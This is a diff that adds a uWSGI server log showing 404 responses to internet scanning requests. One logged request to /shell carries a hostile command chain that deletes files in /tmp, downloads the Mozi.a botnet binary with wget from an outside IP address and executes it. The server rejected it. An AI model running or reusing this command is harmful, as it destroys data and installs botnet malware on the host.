@@ -1,0 +1,11 @@
+Not Found: /shell
+[pid: 7122|app: 0|req: 51/51] 127.0.0.1 () {26 vars in 541 bytes} [Mon May  4 22:50:06 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://77.43.218.116:52946/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 2041 bytes in 3 msecs (HTTP/1.0 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 7122|app: 0|req: 52/52] 127.0.0.1 () {22 vars in 232 bytes} [Tue May  5 00:02:50 2020] GET / => generated 1918 bytes in 2 msecs (HTTP/1.0 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /http:/httpheader.net/
+[pid: 7122|app: 0|req: 53/53] 47.205.52.166 () {36 vars in 687 bytes} [Tue May  5 00:09:47 2020] GET http://httpheader.net/ => generated 1673 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 7122|app: 0|req: 54/54] 127.0.0.1 () {26 vars in 386 bytes} [Tue May  5 01:22:57 2020] GET / => generated 1918 bytes in 3 msecs (HTTP/1.0 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /cache/global/img/gs.gif
+[pid: 7122|app: 0|req: 55/55] 127.0.0.1 () {26 vars in 359 bytes} [Tue May  5 01:31:11 2020] GET /cache/global/img/gs.gif => generated 2005 bytes in 2 msecs (HTTP/1.0 404) 3 headers in 102 bytes (1 switches on core 0)
+Tue May  5 01:31:12 2020 - logsize: 1232, triggering rotation to /root/jarvis/deployment/dongqiudi/log/uwsgi-8080.log.1588642272...
